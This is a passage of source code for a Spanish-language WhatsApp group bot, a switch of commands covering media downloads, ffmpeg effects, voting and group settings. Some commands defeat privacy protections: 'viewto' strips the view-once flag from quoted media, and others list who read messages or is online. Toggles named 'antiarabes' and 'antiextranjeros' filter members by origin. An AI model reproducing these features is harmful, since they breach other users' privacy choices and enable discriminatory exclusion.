reply('*El Bot ya no esta pausado en este grupo.*')
} else {
reply(`Porfavor escriba bien el comando: ${prefix}banchat *si/no*`)
}
break
case 'bienvenida':
case 'welcome':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let welkommm = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "Bienvenida By Kevin",
            "description": "Configurar Mensaje De Bienvenida.",
            "buttonText": "Bienvenida config",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar Bienvenida',
                    "description": '',
                    "rowId": `${prefix}bien-venida activar`
                  },
                  {
                    "title": 'Desactivar Bienvenida',
                    "description": '',
                    "rowId": `${prefix}bien-venida desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(welkommm)
break
case 'antionce':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let unavistaxd = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "AntiOnce By Kevin",
            "description": "Configurar AntiOnce.",
            "buttonText": "Mensajes Una Vista",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar AntiOnce',
                    "description": '',
                    "rowId": `${prefix}anti-once activar`
                  },
                  {
                    "title": 'Desactivar AntiOnce',
                    "description": '',
                    "rowId": `${prefix}anti-once desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(unavistaxd)
break
case 'antilink':
case 'antienlace':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let antilinkk = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "AntiEnlace By Kevin",
            "description": "Configurar El AntiEnlace.",
            "buttonText": "AntiEnlace",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar AntiEnlace',
                    "description": '',
                    "rowId": `${prefix}antie-nlace activar`
                  },
                  {
                    "title": 'Desactivar AntiEnlace',
                    "description": '',
                    "rowId": `${prefix}antie-nlace desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(antilinkk)
break
case 'antiex':
case 'antiextranjeros':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let antiexxx = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "Config AntiEx By Kevin",
            "description": "Configurar El AntiExtranjeros.",
            "buttonText": "AntiExtranjeros",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar AntiExtranjeros',
                    "description": '',
                    "rowId": `${prefix}anti-ex activar`
                  },
                  {
                    "title": 'Desactivar AntiExtranjeros',
                    "description": '',
                    "rowId": `${prefix}anti-ex desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(antiexxx)
break
case 'antiarabes':
case 'antiara':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let antiar = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "Config AntiArabes By Kevin",
            "description": "Configurar El AntiArabes.",
            "buttonText": "AntiArabes",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar AntiArabes',
                    "description": '',
                    "rowId": `${prefix}anti-arabes activar`
                  },
                  {
                    "title": 'Desactivar AntiArabes',
                    "description": '',
                    "rowId": `${prefix}anti-arabes desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(antiar)
break
case 'antidelete':
case 'antieliminarmensaje':
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let deleteanti = kev.prepareMessageFromContent(from,{
  "listMessage": {
            "title": "Config AntiDelete By Kevin",
            "description": "Configurar El AntiDelete.",
            "buttonText": "Anti Eliminar Mensajes",
            "listType": "SINGLE_SELECT",
            "sections": [
              {
                "rows": [
                  {
                    "title": 'Activar AntiDelete',
                    "description": '',
                    "rowId": `${prefix}anti-delete activar`
                  },
                  {
                    "title": 'Desactivar AntiDelete',
                    "description": '',
                    "rowId": `${prefix}anti-delete desactivar`
                  }
                ]
              }
            ]
          }
}, {quoted: faketroli})
kev.relayWAMessage(deleteanti)
break
    case "antihidetag":
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (args[0] == "si") {
          if (isAntihidetag) return reply("El AntiHidetag Ya Esta Activado!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("AntiHidetag Activado!");
        } else if (args[0] == "no") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("AntiHidetag Desactivado!");
        }
        break;
case "unavista":
if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (args[0] == "si") {
          if (isAntiviewonce) return reply("ya estava activado!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("ahora esta activado!");
        } else if (args[0] == "no") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("ahora esta desactivado!");
        }
        break;

case 'viewto':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
      const viewary = []
      const untpar = JSON.stringify(vin.message[type].contextInfo.quotedMessage.viewOnceMessage.message)
      const popet = JSON.parse(untpar)
      console.log(JSON.parse(JSON.stringify(vin.message[type].contextInfo.quotedMessage.viewOnceMessage.message)))
      if (!vin.message[type].contextInfo.quotedMessage.viewOnceMessage) return reply("No es nesesario convertir.")
      const viewtype = Object.keys(popet)[0]
      viewary.push(JSON.parse(untpar))
      delete popet[viewtype].viewOnce
      const viewom = kev.prepareMessageFromContent(from, popet,{quoted: vin})
      await kev.relayWAMessage(viewom)
      break

case 'play':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
let fishcan = `Por motivos de compatibilidad, hemos cambiado el comando *play* por el comando *ytdl*...

Para buscar una musica solo usa *${prefix}ytdl nombre o enlace de alguna música...*`
kev.sendMessage(from, fishcan, MessageType.text, fakevin)
break


    case 'jadibot':
    if(vin.key.fromMe) return reply('Tu eres el bot principar')
    jadibot(reply,kev,from)
    break
    case 'stopjadibot':
    if(vin.key.fromMe)return reply('tidak bisa stopjadibot kecuali owner')
    stopjadibot(reply)
    break
    case 'listbot':
    let tekss = '「 *LISTA DE BOTS* 」\n'
    for(let i of listjadibot) {
    tekss += `*Número* : ${i.jid.split('@')[0]}
*Nombre* : ${i.name}
*Dispositivo* : ${i.phone.device_manufacturer}
*Modelo* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
case 'delvotacion':
            if (!isGroupAdmins && !vin.key.fromMe) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if(isVote) return reply('Sin sesión de votación')
            delVote(from)
            reply('Se elimino la sesión de votación en este grupo')
            break
    case 'votacion':
            if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (isVote) return reply('Sesión de votación en curso en este grupo')
            if(!q) return reply('*Votación*\n\n'+ prefix+ 'votacion @usuario | razón | 1 (1 = 1 minuto)')
            if (vin.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || vin.message.extendedTextMessage.contextInfo == null) {
            let id = vin.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('ingrese el número en la línea 3\nEjemplo: 1-9999\n1 = 1 Min')
            await mentions('Votacion Contra: ' +'@'+ id.split('@')[0]+'\n\n' + `votar = ✅\nnovotar = ❌\n\nRazón: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    case 'ighistoria': 
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if(!q) return reply('Nombre de usuario?')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    kev.sendMessage(from,link,video,{quoted: vin,caption: `*🧇 Instagram Downloader 🧇*`})
                } else {
                    let link = await getBuffer(i.url)
                    kev.sendMessage(from,link,image,{quoted: vin,caption: `*🧇 Instagram Downloader 🧇*`})                  
                }
            }
            });
            break
            case 'pinterest':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if(!q) return reply('Que imagen estas buscando???')
            let pin = await hx.pinterest(q)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await kev.sendMessage(from,di,MessageType.image,{quoted: vin})
            break
    case 'playstore':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if(!q) return reply('Que deseas buscar en playstore?')
            let play = await hx.playstore(q)
        reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            let store = '🧇 *「 PlayStore Busqueda 」 🧇*\n\n'
            for (let i of play){
            store += ` *🧇 Nombre:* ${i.name}

 *🧇 Enlace:* ${i.link}

 *🧇 Dev:* ${i.developer}

 *🧇 Enlace Dev:* ${i.link_dev}\n\n─────────────────────\n\n`
            }
            reply(store)
            break
case 'getsider':
try {
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!isQuotedMsg) return reply('Menciona un mensaje enviado por el bot.')      
infom = await kev.messageInfo(from, vin.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
hemms = infom.deliveries
readon = hemms.map(v => v.jid)
readdin = hemm.map(v => v.jid)
stamp = hemm.map(v => v.t)
      
function toTime(UNIXtimestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIXtimestamp);
if (ribuan) {
a = new Date(UNIXtimestamp * 1000);
} 	
// ambil pecahan waktu masing-masing
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();
// gabungkan ke dalam variable time
var time = `${hour}:${min}:${sec}` ;
return time;
}

function toBulan(UNIXtimestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIXtimestamp);
if (ribuan) {
a = new Date(UNIXtimestamp * 1000);
} 
//buat index bulan
var months = ["Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"];
var myDays = ['Domingo','Lunes','Martes','Miercoles','Jueves','Viernes','Sabadl'];  
// tanggal
var day = a.getDate()
bulanee = a.getMonth()
var thisDay = a.getDay(),
thisDay = myDays[thisDay];
var yy = a.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}` ;
return bul;
}
teksx = `✅ Este Mensaje ah sido visto por:\n\n`
for (let i of hemm) {
teksx += `@${i.jid.split('@')[0]}\n*🕰️ Hora:*  ${toTime(i.t, true)}  ${toBulan(i.t, true)}\n\n`
}
teksx1 = `❎ Este Mensaje no ah sido visto por:\n\n`
for (let i of hemms){
teksx1 += `@${i.jid.split('@')[0]}\n`
teksx1 += `*🕰️ Hora:* ${toTime(i.t, true)} ${toBulan(i.t, true)}\n\n`
}
kev.sendMessage(from, teksx, text, { sendEphemeral: false, quoted: vin, thumbnail: fakeimg, contextInfo: { forwardingScore:999, isForwarded:false, mentionedJid: readdin }})
kev.sendMessage(from, teksx1, text, { sendEphemeral: false, quoted: vin, thumbnail: fakeimg, contextInfo: { forwardingScore:999, isForwarded:false, mentionedJid: readon }})
} catch(e) {
reply('Menciona Un Mensaje Enviado Por El Bot.')
reply(e)
console.log(e)
}
break
case 'sider':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
infom = await kev.messageInfo(from, m.quoted.id)
hemm = infom.reads
readdin = hemm.map(v => v.jid)

stamp = hemm.map(v => v.t)
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
}
 
//criar índice do mês
var months = ["Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"];

 // pega uma fração de cada vez
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();

// combinar em tempo variável
var time = hour + ':' + min + ':' + sec ;
return time;
}
teksx = `✅ Este Mensaje ah sido visto por:\n\n`
hiks = 0
for (let i of hemm) {
hiks += 1
 teksx += `@${i.jid.split('@')[0]}\n`
 }
kev.sendMessage(from, teksx, text, { quoted: faketroli, contextInfo: { mentionedJid: readdin }})
break
case 'online': 
                if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                let online = [...Object.keys(kev.chats.get(ido).presences), kev.user.jid]
                kev.sendMessage(from, '*Usuarios Online*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n` + `\n*online*`, text, { quoted: faketroli,
              contextInfo: { mentionedJid: online }
                })
break 
        case 'query':
        if (!yo && !isOwner) return
    if (!m.quoted) return reply('Menciona algun mensaje')
    let rii = kev.serializeM(await m.getQuotedObj())
    if (!rii.quoted) return reply('Menciona algun mensaje con mención!')
    console.log(m) 
    await rii.quoted.copyNForward(m.chat, true)
break
case 'ren':
case 'reenviar':
meta = await kev.loadMessage(from, vin.message.extendedTextMessage.contextInfo.stanzaId)
			res = await kev.generateForwardMessageContent(meta) 
			res = await kev.prepareMessageFromContent(from, res, {quoted:vin, contextInfo:{mentionedJid:[]}}) 
			kev.relayWAMessage(res)
break
    case 'activar':
            if (!yo && !isOwner) return 
            offline = false
            reply(' ```AHORA ESTAS EN LINEA``` ')
            break       
    case 'estado':
            reply(`*ESTADO*\n${offline ? '> DESCONECTADO' : '> EN LINEA'}\n${banChats ? '> MODO-PRIVADO' : '> MODO-PUBLICO'}`)
            break
    case 'apagar':
            if (!yo && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            reply(' ```AHORA ESTAS DESCONECTADO``` ')
            break   
    case 'get':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if(!q) return reply('Y el enlace?')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
case '?':
case 'bug':
case 'reporte':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!q) return reply('Redacta tu reporte maximo 300 caracteres, intenta ser clar@ y especific@ con tu reporte.')
if (args.length > 300) return kev.sendMessage(from, 'Máximo 300 caracteres', MessageType.text, fakevin)
let teks1 = `*🧇 「  Nuevo Reporte  」 🧇*

*🧇Nombre:* ${pushname}

*🧇Grupo:* ${groupName}

*🧇Número:* wa.me/${senderfix.split("@s.whatsapp.net")[0]}

*🧇Mencion:* @${senderfix.split("@s.whatsapp.net")[0]}

*🧇Error o Bug:* ${q}`
var options = {
 text: teks1, 
contextInfo: {mentionedJid: [senderfix]}
}
kev.sendMessage('50768666666@s.whatsapp.net', options, MessageType.text, {quoted: faketroli})
reply('*🧇 「  Reporte enviado  」 🧇*\n\n*Si el reporte que enviaste es falso o envias algun tipo de lag serás vetado del uso del bot permanentemente asi que intenta no hacer reportes inncesesarios.*')
break


    case 'tomp3':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedVideo) return reply('Menciona un video...!')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            encmedia = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Error: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: vin })
            fs.unlinkSync(ran)
            })
            break
    case 'camararapida':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedVideo) return reply('Menciona un video...!')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            encmedia = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Error: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: vin })
            fs.unlinkSync(ran)
            })
            break
    case 'camaralenta':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedVideo) return reply('Menciona un video...!')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            encmedia = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Error: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: vin })
            fs.unlinkSync(ran)
            })
            break
    case 'camarareversa':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedVideo) return reply('Menciona un video...!')
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            encmedia = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await kev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Error: ${err}`)
            buffer453 = fs.readFileSync(ran)
            kev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: vin })
            fs.unlinkSync(ran)
            })
            break
    case 'contacto':
            if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply(`Número de telefono invalido, intenta hacerlo asi: *${prefix}contacto 50768666666|Kevin*`);
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            kev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
case 'ytdl':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!q) return reply('Que deseas buscar?')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
const dowl = []
const usetube = require('usetube')
const akd = await usetube.searchVideo(q)
if (akd.videos.length == 0) return reply('No se encontraron resultados')
console.log(akd.videos.length)    
hah = 0
for (var i = 0; i < akd.videos.length; i++) {
    dowl.push({
        "title": `${akd.videos[hah].original_title}`,
        "rows": [
            {
                              "title": "🗃️「 MÁS INFORMACIÓN 」🗃️",
                description: `Más información sobre:\n${akd.videos[hah].original_title}`,
                              "rowId": `${prefix}masinfo https://www.youtube.com/watch?v=${akd.videos[hah].id}`
                           },
               {
                              "title": "🎶 「 Mp3/Audio 」 🎶",
                description: `Duración: ${ms(Number(akd.videos[hah].duration + '000'))}\nid: ${akd.videos[hah].id}`,
                              "rowId": `${prefix}ytmp3 https://www.youtube.com/watch?v=${akd.videos[hah].id}`
                           },
               {
                              "title": "🎥 「 Mp4/Video 」 🎥",
